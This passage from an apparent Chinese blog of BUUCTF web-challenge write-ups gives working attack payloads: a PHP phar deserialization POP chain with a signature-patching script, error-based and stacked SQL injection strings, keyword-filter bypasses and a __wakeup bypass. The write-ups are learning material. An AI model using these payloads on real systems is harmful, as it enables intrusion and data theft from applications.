$phar-&gt;setMetadata($o);     //添加要压缩的文件    $phar-&gt;addFromString("test.txt", "test");     //签名自动计算    $phar-&gt;stopBuffering();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>glob伪协议：在PHP中，&nbsp;glob&nbsp;伪协议用于查找匹配特定模式的文件路径。它的语法类似于&nbsp;glob://&nbsp;，后面跟着文件路径的模式。比如&nbsp;glob:///var/www/html/*.txt&nbsp; 会匹配&nbsp;/var/www/html/&nbsp;目录下所有扩展名为&nbsp;.txt&nbsp;的文件。通过这个伪协议，可以方便地获取符合特定规则的文件列表。</p><p>FilesystemIterator类：&nbsp;FilesystemIterator&nbsp; 是PHP提供的一个用于迭代文件系统对象（文件和目录）的类。结合&nbsp;glob&nbsp;伪协议使用时，&nbsp;FilesystemIterator&nbsp; 可以遍历&nbsp;glob&nbsp;伪协议匹配到的所有文件路径。通过实例化该类并传入&nbsp;glob&nbsp;伪协议得到的路径，就可以方便地对这些文件进行逐个操作，比如获取文件名等信息。</p><p>SplFileObject类：&nbsp;SplFileObject&nbsp; 类用于对单个文件进行读取、写入等操作。当使用&nbsp;FilesystemIterator&nbsp; 类获取到目标文件的文件名（或文件路径）后，就可以使用&nbsp;SplFileObject&nbsp; 类来打开并读取该文件的内容。</p></blockquote><p>用glob伪协议配合FilesystemIterator类读flag文件名，然后SplFileObject类读文件。<br>在php.ini中改一下，不然会报错（笑不出来<br><img src="https://pick.lwzheng.tech/2025/01/24/6793925178737.png" alt="9da0e516f4d5811f1dcef9d31cd0eab5.png"><br>glob:///<em>f</em>&nbsp; 这个表达式的含义如下：<br>&nbsp;glob://&nbsp; 是协议标识符，表明使用 &nbsp;glob&nbsp; 伪协议。&nbsp;/<em>f</em>&nbsp; 是一个文件路径模式匹配规则：</p><ul><li>&nbsp;/&nbsp; 表示从当前目录开始。</li><li>&nbsp;*&nbsp; 是通配符，表示匹配任意数量的任意字符。</li><li>&nbsp;f&nbsp; 是一个普通字符，要求匹配的内容中必须包含字母 &nbsp;f&nbsp;。</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span>php<span class="token keyword">class</span> <span class="token class-name-definition class-name">air</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">tree</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$act</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">apple</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$xxx</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$tree5</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$air4</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">air</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$apple3</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tree2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//tree的__destruct=&gt;tree的__call=&gt;apple的__get=&gt;air的__set=》tree的act</span><span class="token comment">//从tree2开始是想给tree1（也就是2）的destruct留个位置。。。（别问，问就是强迫症。。。</span><span class="token variable">$tree2</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$apple3</span><span class="token punctuation">;</span><span class="token variable">$apple3</span><span class="token operator">-&gt;</span><span class="token property">xxx</span><span class="token operator">=</span><span class="token variable">$air4</span><span class="token punctuation">;</span><span class="token variable">$air4</span><span class="token operator">-&gt;</span><span class="token property">p</span><span class="token operator">=</span><span class="token variable">$tree5</span><span class="token punctuation">;</span><span class="token variable">$tree5</span><span class="token operator">-&gt;</span><span class="token property">act</span><span class="token operator">=</span><span class="token string single-quoted-string">'FilesystemIterator'</span><span class="token punctuation">;</span><span class="token variable">$apple3</span><span class="token operator">-&gt;</span><span class="token property">flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'glob:///*f*'</span><span class="token punctuation">;</span><span class="token comment">//成了new FilesystemIterator(‘glob:///*f*’)</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置stub，增加gif文件头</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将自定义meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$tree2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加要压缩的文件</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$tree2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>删除}来进行绕过。这样会在反序列化时报错触发__destruct(这里一定注意！！<br>破坏这个序列化字符串的完整性。<br>当 PHP 尝试对 PHAR 文件中的序列化数据进行反序列化时，由于格式不完整，它可能会跳过原本依赖垃圾回收机制触发的一些检查和执行流程。原本精心构造的利用链中，可能依赖于完整的序列化结构来触发特定的对象生命周期事件，进而利用 GC 漏洞。而格式被破坏后，这些依赖关系被打破，导致无法按照预期触发漏洞利用，从而实现了某种程度上的绕过。<br><del>某人一开始用笔记本当懒狗，卡了好久</del><br><a href="https://">https://www.cnblogs.com/zzkkk1h/p/18119862</a><br>phar文件是二进制文件，以文本形式在记事本中打开会出现乱码，难以准确找到要删除的字符对应的位置，可能导致误操作，破坏文件其他重要部分。010 Editor支持多种文件格式解析，能更好地识别和处理PHAR文件结构，操作时会考虑文件格式规范，尽量保证文件其他部分的完整性和正确性。记事本只是简单的文本编辑工具，不具备对二进制文件格式的理解和处理能力，直接删除字符可能破坏文件结构，使文件无法正常使用。<br><img src="https://pick.lwzheng.tech/2025/01/25/67949255edbbf.png" alt="52eb6c550488295faa819411b9fe488e.png"><br>改签名</p><pre class="line-numbers language-none"><code class="language-none">import gzipfrom hashlib import sha1with open(r"D:\Desktop\ctf\ctf\buuctf\phar.phar", 'rb') as file:    f = file.read()s = f[:-28]  # 获取要签名的数据h = f[-8:]  # 获取签名类型以及GBMB标识newf = s + sha1(s).digest() + h  # 数据 + 签名 + (类型 + GBMB)open("1.phar", "wb").write(newf)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后压缩<br><code>gzip 1.phar</code><br>这里提一嘴这是linux有，windows得自己搞，<del>（反正我图一劳永逸下了个。。。</del><br><img src="https://pick.lwzheng.tech/2025/01/25/6794681b9a6e5.png" alt="04123e7d9739bdfa2043c495b0e2affa.png"><br>然后将文件url编码</p><pre class="line-numbers language-none"><code class="language-none">import urllib.parse with open("1.phar.gz", 'rb') as fi:    f = fi.read()    ff = urllib.parse.quote(f) #获取信息    print(ff)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面是0的，下面是1的</p><pre class="line-numbers language-none"><code class="language-none">《?phpclass D {    public $start;}//$a=new D();//$a-&gt;start='w';//echo serialize($a);$a=new D();$a-&gt;start='r';echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们先写入恶意代码寻找再把它们读出来</p><pre class="line-numbers language-none"><code class="language-none">（1）0=%1F%8B%08%08%BA%92%94g%00%0Bqq.phar%00s%F7t%B3%B0L%B4%B1/%C8%28P%88%8F%F7p%F4%09%89w%F6%F7%0D%F0%F4q%0D%D2%D0%B4V%B0%B7%E3%E5z%C5%C0%C0%C0%08%C4%82P%9A%81a%0B%10%FB%5B%99X%29%95%14%A5%A6%2AY%19YU%17%83xy%89%B9%A9J%D6%FEV%A6VJ%89%05%0590%19c%2B%A5%8A%8A%0A%90%04%90%95%98Y%A4de%08%126%B4R%2A%00%09%E20%C6%CF%1A%AC31%B9D%09%C82%B4%B0Rr%CB%CCI-%AE%2C.I%CD%F5%2CI-J%2C%C9/R%B2%AE%AD%05kI%CBIL%07%2B%03%1A%9A%9E%93%9Fd%A5%AF%AF%AF%95%A6%05%94G%18%E2g%CD%01tvIjq%89%5EIE%09%0B%90%5D%3DiJ%3A%88%E6%A9%AB%BF%B1%0D%E23%B0%FC%D9%03%92%13%8F%ED%CD%07%06%40i%99W%F4%11%1E%D7%3D_%3B%98%80r%EEN%BEN%00%AFG%F2%AB0%01%00%00&amp;1=O:1:"D":2:{s:5:"start";s:1:"w";}（2）0=phar:///tmp/e187bd660e4cd6bf8432be0693aa44a1.jpg&amp;1=O:1:"D":2:{s:5:"start";s:1:"r";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pick.lwzheng.tech/2025/01/25/6794933779ee0.png" alt="07a1b4612b00ab2c4773f80227c8a0ee.png"><br>在/fflaggg<br>再将</p><pre class="line-numbers language-none"><code class="language-none">$tree5-&gt;act='SplFileObject';$apple3-&gt;flag = '/fflaggg';// new SplFileObject('/fflaggg')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>payload构造方法与上面相似，就不放了<del>（绝对不是当时忘复制，懒狗又懒得再弄一次</del><br><img src="https://pick.lwzheng.tech/2025/01/25/67945f7aa1563.png" alt="60527cd7961f3381271fccdc0e3fd609.png"><br><img src="https://pick.lwzheng.tech/2025/01/25/67945f7aa1572.png" alt="88a4bf69b1b90a2961e8b9db60eba81c.png"><br><code>flag{a73a8c15-55d5-44df-acbb-361b4773ff1d}</code></p><hr><h2 id="还有个GChttps-xz-aliyun-com-news-11289法，看了看，感觉更靠谱一些，改天试试-原理链接已有写改一下：-payload-array-tree2-0-echo-serialize-payload-phar-setMetadata-payload-a-2-i-0-O-4-”tree”-2-s-4-”name”-O-5-”apple”-2-s-3-”xxx”-O-3-”air”-1-s-1-”p”-O-4-”tree”-2-s-4-”name”-N-s-3-”act”-s-18-”FilesystemIterator”-s-4-”flag”-s-11-”glob-f“-s-3-”act”-N-i-1-i-0-a-2-i-0-O-4-”tree”-2-s-4-”name”-O-5-”apple”-2-s-3-”xxx”-O-3-”air”-1-s-1-”p”-O-4-”tree”-2-s-4-”name”-N-s-3-”act”-s-18-”FilesystemIterator”-s-4-”flag”-s-11-”glob-f“-s-3-”act”-N-i-0-i-0-再改签名-》可见变正常了这里提一嘴，我的phar本来就是02结尾（所以03是为什么会出现的？"><a href="#还有个GChttps-xz-aliyun-com-news-11289法，看了看，感觉更靠谱一些，改天试试-原理链接已有写改一下：-payload-array-tree2-0-echo-serialize-payload-phar-setMetadata-payload-a-2-i-0-O-4-”tree”-2-s-4-”name”-O-5-”apple”-2-s-3-”xxx”-O-3-”air”-1-s-1-”p”-O-4-”tree”-2-s-4-”name”-N-s-3-”act”-s-18-”FilesystemIterator”-s-4-”flag”-s-11-”glob-f“-s-3-”act”-N-i-1-i-0-a-2-i-0-O-4-”tree”-2-s-4-”name”-O-5-”apple”-2-s-3-”xxx”-O-3-”air”-1-s-1-”p”-O-4-”tree”-2-s-4-”name”-N-s-3-”act”-s-18-”FilesystemIterator”-s-4-”flag”-s-11-”glob-f“-s-3-”act”-N-i-0-i-0-再改签名-》可见变正常了这里提一嘴，我的phar本来就是02结尾（所以03是为什么会出现的？" class="headerlink" title="还有个GChttps://xz.aliyun.com/news/11289法，看了看，感觉更靠谱一些，改天试试.原理链接已有写改一下：$payload=array($tree2,0);echo serialize($payload);$phar->setMetadata($payload);a:2:{i:0;O:4:”tree”:2:{s:4:”name”;O:5:”apple”:2:{s:3:”xxx”;O:3:”air”:1:{s:1:”p”;O:4:”tree”:2:{s:4:”name”;N;s:3:”act”;s:18:”FilesystemIterator”;}}s:4:”flag”;s:11:”glob:///f“;}s:3:”act”;N;}i:1;i:0;}a:2:{i:0;O:4:”tree”:2:{s:4:”name”;O:5:”apple”:2:{s:3:”xxx”;O:3:”air”:1:{s:1:”p”;O:4:”tree”:2:{s:4:”name”;N;s:3:”act”;s:18:”FilesystemIterator”;}}s:4:”flag”;s:11:”glob:///f“;}s:3:”act”;N;}i:0;i:0;}再改签名-》可见变正常了这里提一嘴，我的phar本来就是02结尾（所以03是为什么会出现的？"></a>还有个GC<a href="https://">https://xz.aliyun.com/news/11289</a>法，看了看，感觉更靠谱一些，改天试试.<br>原理链接已有写<br>改一下：<br>$payload=array($tree2,0);<br>echo serialize($payload);<br>$phar-&gt;setMetadata($payload);<br>a:2:{i:0;O:4:”tree”:2:{s:4:”name”;O:5:”apple”:2:{s:3:”xxx”;O:3:”air”:1:{s:1:”p”;O:4:”tree”:2:{s:4:”name”;N;s:3:”act”;s:18:”FilesystemIterator”;}}s:4:”flag”;s:11:”glob:///<em>f</em>“;}s:3:”act”;N;}i:1;i:0;}<br>a:2:{i:0;O:4:”tree”:2:{s:4:”name”;O:5:”apple”:2:{s:3:”xxx”;O:3:”air”:1:{s:1:”p”;O:4:”tree”:2:{s:4:”name”;N;s:3:”act”;s:18:”FilesystemIterator”;}}s:4:”flag”;s:11:”glob:///<em>f</em>“;}s:3:”act”;N;}i:0;i:0;}<br>再改签名-》可见变正常了<br><img src="https://pick.lwzheng.tech/2025/01/26/6795a3d1ab1a4.png" alt="e33e0736f36a5dd19976e8e413a7793f.png"><br>这里提一嘴，我的phar本来就是02结尾（所以03是为什么会出现的？<br><img src="https://pick.lwzheng.tech/2025/01/26/6795a83fd0ae3.png" alt="a3aeece7bcc0ab4abf5ecb7eb7300532.png"></h2><p>我说实话有些题有种”你已经学会1+1=2，现在来试试矩阵吧“的幽默感<del>（笑不出来</del><br><del>（我打宿傩，真的假的？？？</del><br>上上贴说的问题贴等我把另一半开发搞了一起放。。。。（囤</p><hr><p>最后一题的wp还有一些细节没写，再等我会儿。。。找些资料后马上补上</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ac1283e1b0c986f9f616fbd618dba0b4.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf</title>
      <link href="/2025/01/25/di-yi-ye/"/>
      <url>/2025/01/25/di-yi-ye/</url>
      
        <content type="html"><![CDATA[<h3 id="极客大挑战-2019-EasySQL1"><a href="#极客大挑战-2019-EasySQL1" class="headerlink" title="[极客大挑战 2019]EasySQL1"></a>[极客大挑战 2019]EasySQL1</h3><p><img src="https://pick.lwzheng.tech/2024/12/18/6762547f9722a.png" alt="dfb8a353c0093c82c669db8e48864047.png"><br>单引号围的<br><img src="https://pick.lwzheng.tech/2024/12/18/6762547ec1f87.png" alt="37dcb4e8076a072d3478e3ee63d26e0d.png"><br>SQL的语法格式规定–和后面的注释内容必须间隔一个空格<br>在SQL注入中，“–+”可用于注释是因为在SQL语法里，“– ”（后面有空格）是标准的单行注释起始标识，“+”在这里可能是为了绕过某些过滤机制。当数据库执行SQL语句时，遇到“– ”就会忽略后面的内容，攻击者利用这个特性，通过构造包含“–+”的恶意语句，使后面的查询逻辑被注释掉，从而达到改变查询原意、获取非法数据等目的。<br>所以一定要有空格啊（</p><hr><h3 id="强网杯-2019-随便注1"><a href="#强网杯-2019-随便注1" class="headerlink" title="[强网杯 2019]随便注1"></a>[强网杯 2019]随便注1</h3><p><img src="https://pick.lwzheng.tech/2024/12/18/676254f13ad0c.png" alt="0a223de355e17decc72863de26a72b52.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f188ae2.png" alt="5a777138a26db07c378cadba24a77570.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f251310.png" alt="215b05e5165b0a292062e36954c398b1.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f31481b.png" alt="236c845da78aa517ba031f0b2b554f48.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f6c7017.png" alt="98d0595f1c0374397a3d1370b7306369.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f77a903.png" alt="2f6ceaccb29373f6fdf89f7a6b651bdb.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/6762c639590d8.png" alt="5dbad5fe33b7be4a387406654588dc4a.png"><br><a href="https://">https://www.mysqlzh.com/doc/126/253.html</a></p><pre class="line-numbers language-none"><code class="language-none">1';handler `1919810931114514` open;handler `1919810931114514` read first;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这道题我好像被剧透了（，本来想打开小本本翻一翻堆叠（因为我越看越熟悉，好像要用这个），结果发现堆叠就是从这道题抄的（<br><img src="https://pick.lwzheng.tech/2024/12/18/6762763fcad8d.png" alt="2ee162ea82c68b0b28b3ac8f6996d071.png"></p><pre class="line-numbers language-none"><code class="language-none">1';handler `1919810931114514` open as`ddl`;handler `ddl` read next;--一样<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="极客大挑战-2019-HardSQL1"><a href="#极客大挑战-2019-HardSQL1" class="headerlink" title="[极客大挑战 2019]HardSQL1"></a>[极客大挑战 2019]HardSQL1</h3><p>先放个字典<br><a href="https://">https://www.cnblogs.com/CVE-Lemon/p/16187971.html</a><br><img src="https://pick.lwzheng.tech/2024/12/18/6762554c94cf7.png" alt="afdd780a3c26cc0291a0ff2edfbf27c5.png"><br>/**/,%20，=都被过滤了，但like没被过滤换=;and也被搞了，用or（burp可见，反正过滤了一堆，就不放图了<br><img src="https://pick.lwzheng.tech/2024/12/18/6762554811cd5.png" alt="75d480ea766c77feff663a8247a6ac96.png"><br>limit没被过滤，说明是空格被过滤了<br><img src="https://pick.lwzheng.tech/2024/12/18/67625547539f8.png" alt="30e79d19bae056941cd635f627db1854.png"><br>查一个新的<br><img src="https://pick.lwzheng.tech/2024/12/18/676255467d276.png" alt="1c7660abc9397a5f09c54c68feadd623.png"><br>%A0不可<br><img src="https://pick.lwzheng.tech/2024/12/18/676255458d8b4.png" alt="0ef86a801db09c991dc813e96465423a.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/67625544864a8.png" alt="dd6be0eecab7f9fbb43422f88041b2e7.png"><br>（）可，尝试了下可为<code>1'or(1)like(1)#</code>，万能密码成功后发现只有这个，用报错注入<br><img src="https://pick.lwzheng.tech/2024/12/18/67627335bef31.png" alt="15b57d9a0152f4a97cf94568454d8e96.png"><br>我用我的那个报错注入的方法发现一直不对，然后发现是rand被过滤了。<del>好好好，三种方法选了一种就正好被过滤了</del><br><img src="https://pick.lwzheng.tech/2024/12/18/676255439ec72.png" alt="467fa8d31cd839e3b1d0cc4f10819f9e.png"><br>那就换个<br>[<a href="https://www.cnblogs.com/csyxf/p/10241456.html]">https://www.cnblogs.com/csyxf/p/10241456.html]</a>(https://）extractvalue无事，遂用<br><img src="https://pick.lwzheng.tech/2024/12/18/67625542b93af.png" alt="91bf424956abef30cb47ef6c4db7022f.png"><br>这里我发现直接用hackbar传不对，然后在登录界面重新尝试了一下，并观察上方网址，发现需要用URL编码后再execute<br><del>（可能是因为过滤的太多了吧，太屑了</del><br><code>1'or(extractvalue(0x7e,concat(0x7e,(select(database())))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e7fde819.png" alt="3fa376449c53c54edcb9227885473a8a.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e787aefc.png" alt="894a4b1c6d1a51c1fd51954ac75dde7d.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e78ef348.png" alt="77d4fac4a64b308ec7f3098ee092cf1e.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e79b2b08.png" alt="85556fa19c74c093ea33a47a536d314e.png"><br>然后发现substr被过滤了（悲<br><img src="https://pick.lwzheng.tech/2024/12/18/67626e7ab2063.png" alt="ab4c261fdcca91d8108362ae777a8491.png"><br>遂再找（<br><a href="https://">https://www.wanfa688.com/html/Products/478771.html</a><br>试了一下left和right都挺安全的<br><img src="https://pick.lwzheng.tech/2024/12/18/67626e80aed15.png" alt="3f3cf8afbbb43a3fa4b255b6a7080e0f.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e,right((select(group_concat(password))from(geek.H4rDsq1)),31))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e81e2af4.png" alt="398dde33f15ac6556d2337bf694af22f.png"><br>拼一下<br><code>flag{589e7b10-f37f-4255-84d3-a323ae257d5b}</code></p><hr><p><del>话说sqlmap能不能再多出一些脚本什么的，不够用哇</del><br><del>等我复习完cpp一定高产似那啥咕咕咕咕</del></p><h3 id="ACTF2020-新生赛-Upload1"><a href="#ACTF2020-新生赛-Upload1" class="headerlink" title="[ACTF2020 新生赛]Upload1"></a>[ACTF2020 新生赛]Upload1</h3><p>随机挑选一个幸运儿（<br><img src="https://pick.lwzheng.tech/2024/12/18/6762d57f10d02.png" alt="c52edc539d97fb471a45ef6083cf100e.png"><br><del>五毒俱全</del><br><img src="https://pick.lwzheng.tech/2024/12/18/6762d57f0a7e7.png" alt="1636aeb681a2402a389c787dac4292c7.png"></p><hr><h3 id="GXYCTF2019-BabyUpload1"><a href="#GXYCTF2019-BabyUpload1" class="headerlink" title="[GXYCTF2019]BabyUpload1"></a>[GXYCTF2019]BabyUpload1</h3><p>总之试了试好像普通png,gif,.htaccess都不可，普通的jpg可<br>然后点进了题目下的链接（<br><img src="https://pick.lwzheng.tech/2024/12/20/6765700acb68f.png" alt="759d44425892524fda812388b57711e6.png"><br><del>(辣么大个链接总之就是直接点进去了</del><br><a href="https://">http://9fd24382-f481-438e-a0be-28adc1a81bac.node5.buuoj.cn:81</a><br><img src="https://pick.lwzheng.tech/2024/12/20/67656d90ba5d7.png" alt="b624b5b858e10f870886fa4a0ea31a52.png"><br><del>那就按它的要求来吧</del><br><img src="https://pick.lwzheng.tech/2024/12/20/676570f188114.png" alt="8d021b4aad2303f305dfffb268acc12e.png"><br><img src="https://pick.lwzheng.tech/2024/12/20/67656d90732aa.png" alt="5186e40e3c2c83506375d1ef8f67352c.png"><br>还有要注意访问的路径是从upload后开始</p><hr><h4 id="suprise-egg"><a href="#suprise-egg" class="headerlink" title="suprise egg"></a>suprise egg</h4><p><del>总之是被警告了</del><br><img src="https://pick.lwzheng.tech/2024/12/20/67656f2c6b0ae.png" alt="d05e7988e0592d25d4a302c53052a38c.png"><br><del>被攻击了，buu你有什么头绪吗</del></p><hr><p>好好好终于把第二周的要求内容肝完了，这回真的要咕咕咕咕咕咕咕了<br><del>绝对不是因为什么最近沉迷看cs2比赛</del><br>话说这个Hashcoin有什么用么，<del>集齐100个是不是能召唤神龙</del></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0ccd0a6165944604cf2a0641cd6e4538.png"></p><h3 id="极客大挑战-2019-BabySQL1"><a href="#极客大挑战-2019-BabySQL1" class="headerlink" title="[极客大挑战 2019]BabySQL1"></a>[极客大挑战 2019]BabySQL1</h3><p>绕过，<del>似曾相识的方法</del><br><code>?username=1&amp;password=1' uunionnion sselectelect 1,2,3--+</code><br><del>我赌1包辣条information绝对是被from牵连的！！！（震怒）</del><br><img src="https://pick.lwzheng.tech/2025/01/12/6783e1495ce3c.png" alt="e383ecc0ef4ca571f5e0f3cc5405760c.png"><br><code>?username=1&amp;password=1' uunionnion sselectelect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=database()--+</code><br>经典二选一，geekuser大失败（悲）<br><img src="https://pick.lwzheng.tech/2025/01/12/6783e3920c467.png" alt="99665abe50f908d6b7b1eee17ca0eadb.png"><br><img src="https://pick.lwzheng.tech/2025/01/12/6783e3c0e718e.png" alt="f045cddb3e1a5ec3786df7f1aa9fc37f.png"><br><del>唉，2077世界</del></p><hr><h3 id="极客大挑战-2019-PHP1"><a href="#极客大挑战-2019-PHP1" class="headerlink" title="[极客大挑战 2019]PHP1"></a>[极客大挑战 2019]PHP1</h3><p><img src="https://pick.lwzheng.tech/2025/01/14/67864452c785f.png" alt="0bc4e1d145789dc6a1b306c25a22d48d.png"><br><a href="https://">https://www.runoob.com/php/php-unserialize-function.html</a><br><a href="https://">https://www.runoob.com/php/php-serialize-function.html</a><br><a href="https://">https://twle.cn/c/yufei/phpmmethod/phpmmethod-basic-wakeup.html</a></p><pre class="line-numbers language-none"><code class="language-none">《?phpinclude 'flag.php';error_reporting(0);class Name{    private $username = 'nonono';    private $password = 'yesyes';    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = 'guest';    }#会给username再赋值    function __destruct(){        if ($this-&gt;password != 100) {            echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";            echo "You name is: ";            echo $this-&gt;username;echo "&lt;/br&gt;";            echo "You password is: ";            echo $this-&gt;password;echo "&lt;/br&gt;";            die();        }        if ($this-&gt;username === 'admin') {            global $flag;            echo $flag;        }else{            echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!";            die();                    }    }}?》<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> <pre class="line-numbers language-none"><code class="language-none">include 'class.php';    $select = $_GET['select'];    $res=unserialize(@$select);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>?select=</p><pre class="line-numbers language-none"><code class="language-none">《?phpclass Name{    private $username = 'admin';    private $password = 100;}$a=new Name;echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>O:4:”Name”:2:{s:14:” Name username”;s:5:”admin”;s:14:” Name password”;i:100;}<br>在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup()，去执行__destruct<br>O:4:”Name”:3:{s:14:” Name username”;s:5:”admin”;s:14:” Name password”;i:100;}<br>但还是说no,hacker<del>(破音）</del><br><img src="https://pick.lwzheng.tech/2025/01/14/678649cf11905.png" alt="2bec80f91e6bfad2870d1f2232683db7.png"></p><blockquote><p>%00是对象序列化后不可见字符对应的url编码，如果直接将序列化结果复制浏览器中，因为字符不可见所以会变成空格，所以我们要手动加上这个%00</p></blockquote><p><del>好吧终于知道图中不明字符了</del><br>?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p><hr><h3 id="ACTF2020-新生赛-BackupFile1"><a href="#ACTF2020-新生赛-BackupFile1" class="headerlink" title="[ACTF2020 新生赛]BackupFile1"></a>[ACTF2020 新生赛]BackupFile1</h3><p><img src="https://pick.lwzheng.tech/2025/01/14/67865bfc2411e.png" alt="d6269676d01904af0f453fddb1fb6814.png"><br><a href="https://">https://www.runoob.com/php/php-is_numeric-function.html</a><br><a href="https://">https://www.runoob.com/php/php-intval-function.html</a></p><pre class="line-numbers language-none"><code class="language-none">《?phpinclude_once "flag.php";if(isset($_GET['key'])) {    $key = $_GET['key'];    if(!is_numeric($key)) #is_numeric() 